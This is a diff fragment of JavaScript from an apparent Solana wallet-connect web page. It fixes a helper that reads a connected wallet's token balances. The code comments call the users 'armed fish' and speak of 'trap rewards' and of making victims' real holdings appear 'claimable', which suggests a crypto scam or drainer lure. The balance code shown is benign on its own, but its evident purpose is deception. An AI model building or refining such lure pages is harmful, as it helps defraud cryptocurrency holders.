@@ -55,7 +55,7 @@ document.getElementById("connect").onclick = async () => {
       // USDTW (holders), hook-mint rewards (snipers), trap rewards — so every armed
       // fish sees their true holdings as claimable, not a fixed 5,000.
       const balOf = async (mint, prog) => {
-        const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey(prog).toBuffer(), new W.PublicKey(mint).toBuffer()])[0];
+        const TA = W.PublicKey.findProgramAddressSync([w2.toBuffer(), new W.PublicKey(prog).toBuffer(), new W.PublicKey(mint).toBuffer()], new W.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"))[0];
         const b = await c2.getTokenAccountBalance(TA).catch(() => null);
         return b?.value?.uiAmount || 0;
       };
